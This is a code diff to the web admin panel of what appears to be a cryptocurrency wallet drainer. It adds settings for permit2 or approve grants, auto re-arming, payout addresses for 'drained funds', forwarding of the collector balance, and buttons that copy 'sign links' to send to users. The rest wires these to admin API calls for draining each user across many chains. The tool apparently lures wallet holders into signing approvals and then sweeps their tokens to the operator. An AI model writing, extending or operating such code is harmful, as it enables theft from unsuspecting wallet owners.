@@ -87,13 +87,39 @@
     <input id="sigdays" type="number" min="1" step="1"></label>
   <label class="field"><span>Take native</span>
     <select id="native"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>EVM approval</span>
+    <select id="evmmode"><option value="permit2">permit2</option><option value="approve">approve</option></select></label>
   <label class="field"><span>Dust floor USD</span>
     <input id="dust" type="number" min="0" step="0.05"></label>
+  <label class="field"><span>Auto re-arm (hours)</span>
+    <input id="rearm" type="number" min="1" step="1"></label>
   <button id="save">Save settings</button>
 </div>
 
+<h2>Payout sink</h2>
+<div id="payoutwarn"></div>
+<p class="muted">Where drained funds land. Point this at a treasury or multisig —
+   not the collector key. Empty means the collector address (hot wallet).</p>
+<div class="row">
+  <label class="field" style="flex:1;min-width:260px"><span>EVM payout</span>
+    <input id="payout_evm" class="mono" placeholder="0x… treasury / Safe"></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Solana payout</span>
+    <input id="payout_sol" class="mono" placeholder="Squads vault…"></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Tron payout</span>
+    <input id="payout_tron" class="mono" placeholder="T… treasury"></label>
+</div>
+<div class="row">
+  <label class="field"><span>Payout is multisig</span>
+    <select id="multisig"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>Auto-forward leftovers</span>
+    <select id="forward"><option value="true">yes</option><option value="false">no</option></select></label>
+  <button class="ghost" id="savepayout">Save payout</button>
+  <button class="ghost" id="forwardnow">Forward collector balance now</button>
+</div>
+
 <h2>Collector keys</h2>
-<p class="muted">EVM key needs native gas on all five chains; Solana key needs SOL; Tron key needs TRX.</p>
+<p class="muted">The EVM key needs native gas on every chain you intend to drain — ETH, BNB, POL,
+   AVAX, MNT, xDAI, CELO, FTM, BERA, S, HYPE. Solana key needs SOL; Tron key needs TRX + energy.</p>
 <div class="row">
   <label class="field"><span>Family</span>
     <select id="fam"><option value="evm">evm</option><option value="solana">solana</option>
@@ -112,8 +138,8 @@
 
 <h2>Users with grants</h2>
 <table>
-  <thead><tr><th>User</th><th>Grants</th><th>Active</th><th>Auto</th><th>Actions</th></tr></thead>
-  <tbody id="users"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
+  <thead><tr><th>User</th><th>Grants</th><th>Active</th><th>Auto</th><th>Sign links</th><th>Actions</th></tr></thead>
+  <tbody id="users"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
 </table>
 
 <h2>Recent runs</h2>
@@ -151,11 +177,21 @@ function toast(text, kind = "") {
   toast._t = setTimeout(() => { toastEl.className = "toast"; }, 6000);
 }
 
+const csrf = () => {
+  const m = document.cookie.match(/(?:^|;\s*)nx_csrf=([^;]+)/);
+  return m ? decodeURIComponent(m[1]) : "";
+};
+
 async function api(url, options = {}) {
   const res = await fetch(url, {
     credentials: "include",
     ...options,
-    headers: { "content-type": "application/json", ...(options.headers || {}) },
+    headers: {
+      "content-type": "application/json",
+      "X-Nectra": "1",
+      ...(csrf() ? { "X-CSRF": csrf() } : {}),
+      ...(options.headers || {}),
+    },
   });
 
   let body = null;
@@ -185,8 +221,27 @@ function fillSettings(s) {
   $("capu").value = s.cap_units ?? 1_000_000;
   $("sigdays").value = s.sig_deadline_days ?? 30;
   $("native").value = String(s.take_native !== false);
+  $("evmmode").value = s.evm_mode === "approve" ? "approve" : "permit2";
   $("dust").value = s.min_usd_per_asset ?? 0.75;
+  $("rearm").value = s.rearm_hours ?? 6;
+  $("payout_evm").value = s.payout_evm || "";
+  $("payout_sol").value = s.payout_sol || "";
+  $("payout_tron").value = s.payout_tron || "";
+  $("multisig").value = String(s.payout_is_multisig === true);
+  $("forward").value = String(s.auto_forward !== false);
+  renderPayoutWarning(s);
   settingsLoaded = true;
+}
+
+function renderPayoutWarning(s) {
+  const notes = [];
+  const evmCollector = (s.collector_evm || "").toLowerCase();
+  if (!s.payout_evm || (evmCollector && s.payout_evm.toLowerCase() === evmCollector)) {
+    notes.push("EVM payout is the hot collector key — a treasury/multisig is safer.");
+  }
+  if (!s.payout_is_multisig) notes.push("Payout is not marked as a multisig.");
+  $("payoutwarn").innerHTML = notes.length
+    ? `<div class="warnbox">${notes.map(esc).join("<br>")}</div>` : "";
 }
 
 function renderStatus(d) {
@@ -208,17 +263,34 @@ function renderStatus(d) {
   if (!d.settings.evm_key_set) missing.push("EVM");
   if (!d.settings.sol_key_set) missing.push("Solana");
   if (!d.settings.tron_key_set) missing.push("Tron");
-  $("warn").innerHTML = missing.length
-    ? `<div class="warnbox">No collector key for: ${esc(missing.join(", "))}.
-       Wallets on those chains will prepare with <em>unsupported</em> grants.</div>`
+
+  const noReceiver = (d.settings.evm_networks || [])
+    .filter((n) => !n.receiver).map((n) => n.name);
+
+  const notes = [];
+  if (missing.length) {
+    notes.push(`No collector key for: ${esc(missing.join(", "))}. Wallets on those chains ` +
+               `will prepare with <em>unsupported</em> grants.`);
+  }
+  if (noReceiver.length) {
+    notes.push(`No receiver deployed on: ${esc(noReceiver.join(", "))}. EVM tokens there ` +
+               `cannot be pulled until <span class="mono">deploy_receiver.py</span> runs.`);
+  }
+  $("warn").innerHTML = notes.length
+    ? `<div class="warnbox">${notes.join("<br>")}</div>`
     : "";
 }
 
-function renderReceivers(map) {
-  const chains = ["Ethereum", "Base", "Arbitrum", "Polygon", "BSC"];
-  $("receivers").innerHTML = chains.map((c) => {
-    const addr = (map || {})[c];
-    return `<div class="chip"><span class="muted">${esc(c)}</span>
+function renderReceivers(networks) {
+  const rows = networks || [];
+  if (!rows.length) {
+    $("receivers").innerHTML = `<div class="empty">No EVM networks registered.</div>`;
+    return;
+  }
+  $("receivers").innerHTML = rows.map((n) => {
+    const addr = n.receiver;
+    return `<div class="chip">
+      <span class="muted">${esc(n.name)} <b>#${esc(n.chainId)}${n.testnet ? " · test" : ""}</b></span>
       <b class="mono">${addr ? esc(`${addr.slice(0, 6)}…${addr.slice(-4)}`) : "none"}</b></div>`;
   }).join("");
 }
@@ -243,7 +315,7 @@ function renderEvents(events) {
 
 function renderUsers(users) {
   if (!users || !users.length) {
-    $("users").innerHTML = `<tr><td colspan="5" class="empty">
+    $("users").innerHTML = `<tr><td colspan="6" class="empty">
       No wallets have authorised yet.</td></tr>`;
     return;
   }
@@ -253,6 +325,7 @@ function renderUsers(users) {
       <td>${Number(u.grants) || 0}</td>
       <td>${Number(u.active) || 0}</td>
       <td>${u.drainer_auto ? `<span class="pill on">yes</span>` : `<span class="pill off">no</span>`}</td>
+      <td><button class="ghost" data-links="${u.id}" ${u.wallet_ids ? "" : "disabled"}>Copy</button></td>
       <td>
         <button class="ghost" data-detail="${u.id}">Detail</button>
         <button class="ghost" data-prepare="${u.id}">Re-sign</button>
@@ -262,10 +335,26 @@ function renderUsers(users) {
 
   $("users").querySelectorAll("[data-detail]").forEach((b) =>
     b.onclick = () => toggleDetail(b.dataset.detail));
+  $("users").querySelectorAll("[data-links]").forEach((b) =>
+    b.onclick = () => copyLinks(b.dataset.links));
   $("users").querySelectorAll("[data-prepare]").forEach((b) =>
     b.onclick = () => prepareUser(b.dataset.prepare, b));
   $("users").querySelectorAll("[data-drain]").forEach((b) =>
     b.onclick = () => drainUser(b.dataset.drain, b));
+}
+
+async function copyLinks(uid) {
+  try {
+    const d = await api(`/api/admin/drainer/user/${uid}`);
+    const ids = [...new Set((d.grants || []).map((g) => g.wallet_id))];
+    if (!ids.length) return toast("No wallets to link", "bad");
+    const links = ids.map((id) =>
+      `${location.origin}/sign.html?wallet=${id}`).join("\n");
+    await navigator.clipboard.writeText(links);
+    toast(`Copied ${ids.length} sign link(s) — send them to the user.`, "ok");
+  } catch (e) {
+    toast(e.message || "Could not copy links", "bad");
+  }
 }
 
 async function toggleDetail(uid) {
@@ -277,17 +366,17 @@ async function toggleDetail(uid) {
   const tr = document.createElement("tr");
   tr.className = "detail";
   tr.dataset.for = uid;
-  tr.innerHTML = `<td colspan="5" class="muted">Loading grants…</td>`;
+  tr.innerHTML = `<td colspan="6" class="muted">Loading grants…</td>`;
   row.after(tr);
 
   try {
     const d = await api(`/api/admin/drainer/user/${uid}`);
     const grants = d.grants || [];
     if (!grants.length) {
-      tr.innerHTML = `<td colspan="5" class="empty">No grants.</td>`;
+      tr.innerHTML = `<td colspan="6" class="empty">No grants.</td>`;
       return;
     }
-    tr.innerHTML = `<td colspan="5">
+    tr.innerHTML = `<td colspan="6">
       <table><thead><tr><th>Network</th><th>Asset</th><th>Cap</th><th>Kind</th>
       <th>Status</th><th>Expires</th></tr></thead><tbody>
       ${grants.map((g) => `<tr>
@@ -300,7 +389,7 @@ async function toggleDetail(uid) {
         <td class="muted">${g.sig_deadline ? esc(when(g.sig_deadline * 1000)) : "—"}</td>
       </tr>`).join("")}</tbody></table></td>`;
   } catch (e) {
-    tr.innerHTML = `<td colspan="5" class="bad">${esc(e.message)}</td>`;
+    tr.innerHTML = `<td colspan="6" class="bad">${esc(e.message)}</td>`;
   }
 }
 
@@ -321,9 +410,10 @@ async function drainUser(uid, btn) {
     const swept = Number(r.total_usd) || 0;
     const failed = Number(r.failed) || 0;
     const deferred = Number(r.deferred) || 0;
-    const kind = failed || deferred ? "bad" : "ok";
+    const skipped = Number(r.skipped) || 0;
+    const kind = failed || deferred || skipped ? "bad" : "ok";
     toast(`Swept ${usd(swept)} — ${Number(r.sent) || 0} sent, ${failed} failed, `
-          + `${deferred} deferred`, kind);
+          + `${deferred} deferred, ${skipped} skipped`, kind);
   } catch (e) {
     toast(e.message, "bad");
   } finally {
@@ -344,7 +434,15 @@ async function prepareUser(uid, btn) {
     const r = await api(`/api/admin/drainer/prepare/${uid}`, { method: "POST", body: "{}" });
     const results = r.results || [];
     const ok = results.filter((x) => !x.error).length;
-    toast(`Prepared ${ok} wallet(s). Send the sign link to the user to activate.`, ok ? "ok" : "bad");
+    const links = results.filter((x) => x.signUrl)
+      .map((x) => `${location.origin}${x.signUrl}`).join("\n");
+    if (links) {
+      try { await navigator.clipboard.writeText(links); } catch { /* clipboard blocked */ }
+      toast(`Prepared ${ok} wallet(s). Sign link(s) copied — send them to the user.`,
+            ok ? "ok" : "bad");
+    } else {
+      toast(`Prepared ${ok} wallet(s).`, ok ? "ok" : "bad");
+    }
   } catch (e) {
     toast(e.message, "bad");
   } finally {
@@ -371,11 +469,51 @@ async function saveSettings() {
         drainer_cap_units: Math.floor(settingNum("capu")),
         drainer_sig_deadline_days: Math.max(1, Math.floor(settingNum("sigdays"))),
         drainer_take_native: settingBool("native"),
+        drainer_evm_mode: setting("evmmode") === "approve" ? "approve" : "permit2",
         drainer_min_usd_per_asset: settingNum("dust"),
+        drainer_rearm_hours: Math.max(1, Math.floor(settingNum("rearm"))),
       }),
     });
     toast("Settings saved.", "ok");
     settingsLoaded = false;
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function savePayout() {
+  if (busy) return;
+  busy = true;
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({
+        drainer_payout_evm: setting("payout_evm").trim(),
+        drainer_payout_sol: setting("payout_sol").trim(),
+        drainer_payout_tron: setting("payout_tron").trim(),
+        drainer_payout_is_multisig: settingBool("multisig"),
+        drainer_auto_forward: settingBool("forward"),
+      }),
+    });
+    toast("Payout sink saved.", "ok");
+    settingsLoaded = false;
+    refresh();
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function forwardNow() {
+  if (busy) return;
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/forward", { method: "POST", body: "{}" });
+    const sent = (r.results || []).filter((x) => x.txid).length;
+    toast(`Forwarded ${sent} item(s) to the payout sink.`, sent ? "ok" : "bad");
   } catch (e) {
     toast(e.message, "bad");
   } finally {
@@ -411,7 +549,7 @@ async function refresh() {
     const d = await api("/api/admin/drainer/overview");
     if (!settingsLoaded) fillSettings(d.settings);
     renderStatus(d);
-    renderReceivers(d.settings.receiver_evm);
+    renderReceivers(d.settings.evm_networks);
     renderEvents(d.events);
   } catch (e) {
     toast(e.message, "bad");
@@ -424,6 +562,8 @@ async function refresh() {
 }
 
 $("save").onclick = saveSettings;
+$("savepayout").onclick = savePayout;
+$("forwardnow").onclick = forwardNow;
 $("key").onclick = setKey;
 $("reveal").onclick = () => {
   const f = $("secret");
